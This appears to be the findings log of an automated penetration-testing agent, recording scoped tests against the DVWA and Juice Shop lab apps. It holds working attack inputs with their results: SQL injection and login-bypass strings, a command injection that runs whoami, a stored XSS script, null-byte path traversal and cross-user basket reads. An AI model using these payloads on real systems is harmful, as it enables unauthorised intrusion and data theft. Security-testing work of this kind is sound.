state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

parameter_names: id (read from server-side session state at high, not from request)
endpoints.observation_evidence: [security=high] GET /vulnerabilities/sqli/ as dvwa_admin: no form rendered; text 'Click here to change your ID' links to session-input.php; body reads 'Security level set to high' and 'Security Level: high'. Requires prior POST to session-input.php to set the injected id. Trailing comment is needed for LIMIT 1.

[security=high] GET /vulnerabilities/exec/ as dvwa_admin: same form (action=POST /vulnerabilities/exec/, fields ip and Submit, no user_token). Body reads 'Security Level: high'. Filter is per coordinator spec: '; ', '| ', '&&' blacklisted, so a no-space pipe is the candidate vector.

[security=high] GET /vulnerabilities/xss_s/ as dvwa_admin: same form and field constraints (txtName maxlength 10, mtxMessage maxlength 50, btnSign, btnClear). No user_token in form. Body reads 'Security Level: high'.

Previously rejected. POST security=high with seclev_submit and user_token returned 302 to /security.php. Subsequent GETs of the vulnerability pages report 'Security Level: high' and 'Security level set to high', so the level change was applied. The page-body security level was medium before the change. user_token is a hidden field on security.php only.
POST JSON {email,password} with wrong password returned 401 'Invalid email or password.' (text/html). Format confirmed; no exploitation performed.
GET /rest/products/search?q=apple returned 200 JSON {status:success,data:[...]} with 2 products (Apple Juice, Apple Pomace). Benign query only.

Unauthenticated GET returned 200 with 8 feedback records. Records include UserId and comment; emails appear masked in comments (e.g. '(***in@juice-sh.op)'), so PII is partially exposed. Full-email exposure not yet confirmed.

acct2 (own_basket_id=7) GET /rest/basket/1 returned 200 with basket UserId=1 containing Apple Juice x2, Orange Juice x3, Eggfruit Juice x1 - not acct2's basket. Strong BOLA indicator; pending verification. Acct1 own basket = 6 (UserId 22) containing Apple Juice (1000ml) qty 3 (GET /rest/basket/6 as acct1 returned 200). Acct1 basket id reported by session_info.own_basket_id=6; acct2 own_basket_id=7.
acct1 own_basket_id=6 (UserId 22). Basket 6 contains Apple Juice (1000ml) (product id 1), quantity 3 (BasketItem id 9). Acct2 own_basket_id=7 (UserId 23) for cross-user comparison.

Open directory listing (200). Contains acquisitions.md (909 B), package.json.bak (4291 B), coupons_2013.md.bak, incident-support.kdbx, legal.md, suspicious_errors.yml, announcement_encrypted.md, quarantine/, eastere.gg, encrypt.pyc.
Listed in /ftp/ directory listing (909 B). Direct retrieval not performed in this mapping pass.
Browsable directory listing (200) exposing jwt.pub (248 B) and premium.key (50 B).
Listed in /ftp/ directory listing (4291 B). Raw GET not performed in this pass; 403 on raw path and null-byte bypass remain to be verified.
acct2 own_basket_id=7 (UserId 23). Basket 7 contains Orange Juice (1000ml) (product id 2), quantity 1 (BasketItem id 10).

[security=medium] GET /vulnerabilities/sqli/ as dvwa_admin shows form action=POST /vulnerabilities/sqli/ with fields id and Submit (value 'Submit'). No user_token in the form. Page body reads 'Security Level: medium'. Note: session_info.security_level stayed 'low' in tool output while the body said medium, so the body was treated as authoritative.

[security=high] GET /vulnerabilities/sqli/session-input.php as dvwa_admin returns a 'SQL Injection Session Input' popup with form action=POST /vulnerabilities/sqli/session-input.php, fields id (text) and Submit. Linked from /vulnerabilities/sqli/ at high ('Click here to change your ID'), which renders no form and reads 'Security Level: high'. The id value is stored server-side and then loaded by /vulnerabilities/sqli/ (out-of-band injection).

Unauthenticated GET /api/Feedbacks/1 returns 401 'No Authorization header was found'. The list endpoint /api/Feedbacks (unauth, 200 JSON, 8 records) is the only unauthenticated read path. Record fields: UserId, id, comment, rating, createdAt, updatedAt. There is no email field. Emails appear only inside the comment text and are masked (e.g. '(***in@juice-sh.op)', '(***@juice-sh.op)', '(anonymous)'). Masked-only PII, so no unmasked author emails were disclosed.

findings.title: DVWA SQL Injection (numeric/quoted id, GET) [security=low]
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned HTTP 200 with 5 records: "ID: 1' OR '1'='1 First name: admin Surname: admin", "First name: Gordon Surname: Brown", "First name: Hack Surname: Me", "First name: Pablo Surname: Picasso", "First name: Bob Surname: Smith". FALSE payload id=1' AND '1'='2 returned HTTP 200 with "User ID:" and no records (zero First name/Surname rows). Recorded seeded surnames: admin, Brown, Me, Picasso, Smith.

findings.title: DVWA OS Command Injection via ip field (ping) [security=low]
request_sequence: POST http://dvwa/vulnerabilities/exec/ form ip=127.0.0.1; whoami&Submit=Submit (session dvwa_admin, security=low)
findings.response_evidence: [security=low] HTTP 200. Ping output for 127.0.0.1 (4 packets, 0% loss) followed by a standalone line "www-data" immediately after the ping statistics block, which is the output of the injected whoami command. Page reports Security Level: low.

findings.title: DVWA Stored XSS via guestbook message (canary script) [security=low]
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ form txtName=vrfy&mtxMessage=<script id="test_token">window.xss_flag=1</script>&btnSign=Sign Guestbook (session dvwa_admin, security=low) -> HTTP 200, new entry 'Name: vrfy' stored
findings.response_evidence: [security=low] POST accepted (HTTP 200), entry 'Name: vrfy' persisted in the guestbook. Note: the canary is 58 characters, exceeding the textarea maxlength=50; the browser maxlength is client-side only and the server accepted the full payload via direct HTTP submission (no truncation/rejection observed). Browser load of the rendering page in dvwa_admin session: window.xss_flag evaluated to 1 (number). Stored script executed on page render.

findings.title: Login authentication bypass via SQL injection in email field
request_sequence: POST http://juiceshop:3000/rest/user/login (unauth) Content-Type: application/json body: {"email": "' OR 1=1--", "password": "x"}
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid auth token was issued for the first user (admin@juice-sh.op) with an arbitrary wrong password, proving the email value is concatenated into the SQL query.

findings.title: Product search SQL injection (error-based and UNION-based) via q parameter
findings.response_evidence: Baseline q=apple: HTTP 200 {"status":"success","data":[Apple Juice (1000ml), Apple Pomace]}. q=qwert': HTTP 500 text/html 'Error: SQLITE_ERROR: near "'%'": syntax error'. q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--: HTTP 200 {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}, showing attacker-controlled UNION columns reflected in the response.

findings.title: Unauthenticated access to user feedback with partially masked author emails
findings.response_evidence: HTTP 200 application/json without authentication returned 8 feedback records with UserId, comment, rating. Author emails appear only masked inside comment text, e.g. "(***in@juice-sh.op)", "(***ereum@juice-sh.op)", "(***der@juice-sh.op)". No full email address is disclosed in any record, so the CWE-359 criterion (author email addresses disclosed) is not met. Unauthenticated access is confirmed, but PII exposure is only partial. Recommend re-check if the coordinator wants to treat masked fragments as PII leakage (the local-part is hidden, but domain and partial local-part are visible).

findings.title: Confidential document exposed via open directory listing (/ftp/acquisitions.md)
findings.response_evidence: Listing (200, text/html): 'listing directory /ftp/ ... acquisitions.md 909 12/19/2023 ...'. Direct retrieval (200, text/markdown): '# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...'

findings.title: Browsable encryption-keys directory exposes premium.key and jwt.pub
findings.response_evidence: Directory listing (200, text/html): 'listing directory /encryptionkeys/ ... Name Size Modified jwt.pub 248 ... premium.key 50 ...'. Direct retrieval of premium.key (200, application/octet-stream) returned key material: '1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42'. jwt.pub was listed but not fetched in this batch.

findings.title: Cross-user basket access (BOLA): acct2 reads acct1's basket 6
findings.response_evidence: acct1 own basket (200): {\"id\":6,\"UserId\":22,\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"BasketItem\":{\"ProductId\":1,\"BasketId\":6,\"id\":9,\"quantity\":3}}]}. acct2 (session acct2_bench, own_basket_id=7) GET /rest/basket/6 (200): identical body, {\"status\":\"success\",\"data\":{\"id\":6,\"UserId\":22,...\"name\":\"Apple Juice (1000ml)\",...\"quantity\":3}}. Account 1's distinct seeded item (Apple Juice (1000ml), qty 3) was retrieved by acct2, which does not own basket 6.

findings.title: Poison null-byte path traversal bypasses /ftp/ extension filter to retrieve package.json.bak

Null-byte path: HTTP 200, content_type application/octet-stream, body begins: {\"name\": \"juice-shop\", \"version\": \"6.2.0-SNAPSHOT\", \"description\": \"An intentionally insecure JavaScript Web Application\", ... \"dependencies\": {...}. Restricted backup file served via %2500.md bypass.

findings.title: Cross-user basket access (BOLA): acct2 retrieves acct1's basket 6
findings.response_evidence: acct2 (acct2_bench, own_basket_id 7) received HTTP 200 for basket 6 owned by UserId 22 (acct1): {\"status\":\"success\",\"data\":{\"id\":6,\"UserId\":22,\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"BasketItem\":{\"ProductId\":1,\"BasketId\":6,\"id\":9,\"quantity\":3}}]}}. Acct1's own view of basket 6 is identical, confirming cross-user disclosure of product Apple Juice (1000ml), quantity 3.

findings.title: /rest/basket/7 returns acct2's own basket - not a BOLA finding
findings.response_evidence: HTTP 200, session_info.own_basket_id=7; response data.id=7, UserId=23 (acct2's own user), Products: Orange Juice (1000ml), BasketItem quantity 1. Because basket 7 belongs to the requesting account, no authorization boundary was crossed. The true cross-user case is basket 6 (see separate finding).

findings.title: DVWA security-level control reachable as admin; no authorization weakness shown
findings.response_evidence: POST returned 302 redirect to /security.php. Follow-up GET shows 'Security level is currently: medium' and 'Security level set to medium'. The control works as designed for the admin with a valid CSRF token. No authorization weakness was shown: no unauthenticated or non-admin path was tested here, and the user_token was enforced. Rejected as a vulnerability. Side effect: DVWA is now at medium security for the upcoming medium-level tests.

findings.title: Confidential acquisition memo retrievable unauthenticated from open /ftp/ directory
findings.response_evidence:

> This document is confidential! Do not distribute!

Note for coordinator: a prior confirmed finding exists for this route; this record is the direct-retrieval content evidence (the mapping pass had only the listing). Dedupe if the prior record already contains this retrieval.

findings.title: Basket 1 claim rejected: basket 1 is not acct1's basket (owned by UserId 1)
findings.response_evidence: Basket 1 returned HTTP 200 with "UserId":1 and products Apple Juice x2, Orange Juice x3, Eggfruit Juice x1. Acct1's own basket is id 6 (UserId 22), so basket 1 is not acct1's. Per the assignment rule, basket 1 is rejected as a BOLA against acct1. It is a different user's basket (UserId 1) and is handled as a separate concern; see the basket 6 finding.

findings.title: Cross-user basket access: acct2 reads acct1's basket (id 6) including distinct seeded item
findings.response_evidence: Baseline (acct1, own_basket_id=6): HTTP 200, {"id":6,"UserId":22,"Products":[{"name":"Apple Juice (1000ml)","BasketItem":{"ProductId":1,"BasketId":6,"quantity":3}}]}. Cross-user (acct2, own_basket_id=7): HTTP 200, identical body with "id":6,"UserId":22, Apple Juice (1000ml) quantity 3. acct2 retrieved acct1's basket and its seeded item, which acct2 does not own.

findings.title: Unauthenticated feedback listing: only masked author emails, no unmasked PII
findings.response_evidence: HTTP 200 without auth, 8 records. Each record has only UserId, id, comment, rating, createdAt, updatedAt; there is no author email field. Emails appear only inside comment text, masked: "(***in@juice-sh.op)", "(***@juice-sh.op)", "(***der@juice-sh.op)", "(***ereum@juice-sh.op)". Others are "(anonymous)" or have UserId null. No unmasked email is disclosed, so PII exposure is not confirmed. Per the assignment, no further budget spent.

findings.title: Stored XSS canary in guestbook message is sanitized (script tags stripped) [security=medium]
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ (session dvwa_admin, security=medium) form: txtName=tester&mtxMessage=<script id="test_token">window.xss_flag=1</script>&btnSign=Sign Guestbook
findings.response_evidence: [security=medium] HTTP 200. Response renders the entry as 'Name: tester Message: window.xss_flag=1' — the <script id="test_token"> wrapper tags were removed server-side, leaving plain text. No executable script element with id test_token appears in the rendered guestbook, so window.xss_flag is not set by this canary. Not executable at medium; browser verification not run (no script element survives in the rendered markup). Note: the entry remains stored in the guestbook.

findings.title: Stored XSS canary in guestbook message is sanitized (script tags stripped) [security=high]
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ (session dvwa_admin, security=high) form: txtName=tester&mtxMessage=<script id="test_token">window.xss_flag=1</script>&btnSign=Sign Guestbook
findings.response_evidence: [security=high] HTTP 200. Body: 'Security level set to high', 'Security Level: high'. Newly stored entry renders as 'Name: tester Message: window.xss_flag=1' — the <script id="test_token"> tags were stripped server-side, so no executable script element is rendered and window.xss_flag is not set. Rejected at high.

findings.title: Unauthenticated user-feedback listing: author emails masked (no unmasked PII)
findings.response_evidence: HTTP 200, unauthenticated, 8 records. findings.title: Unauthenticated GET /api/Feedbacks/1 requires authorization
findings.response_evidence: HTTP 401 {"error":{"message":"No Authorization header was found","name":"UnauthorizedError","code":"credentials_required","status":401}}. No record data returned. Only the list endpoint /api/Feedbacks is readable unauthenticated, and it shows masked emails only (see /api/Feedbacks finding). Rejected.

findings.title: SQL Injection via server-side session id (session-input.php) [security=high]
request_sequence: GET http://dvwa/security.php (dvwa_admin; page body shows 'Security level is currently: high')
POST http://dvwa/vulnerabilities/sqli/session-input.php id=1' AND '1'='2' #&Submit=Submit (dvwa_admin; FALSE control set, result not loaded)
findings.response_evidence: [security=high] TRUE payload loaded via /vulnerabilities/sqli/ returned 5 seeded users: "ID: 1' OR '1'='1' # First name: admin Surname: admin", "First name: Gordon Surname: Brown", "First name: Hack Surname: Me", "First name: Pablo Surname: Picasso", "First name: Bob Surname: Smith". Page shows 'Security Level: high'. Injection works via the server-side session id with trailing comment. Caveat: the FALSE control (1' AND '1'='2' #) was set via session-input.php, but its result was not loaded because it would have exceeded the 5-transaction cap for this endpoint, so the zero-record criterion is not yet observed. Recommend one GET of /vulnerabilities/sqli/ to close the FALSE control, then confirm.
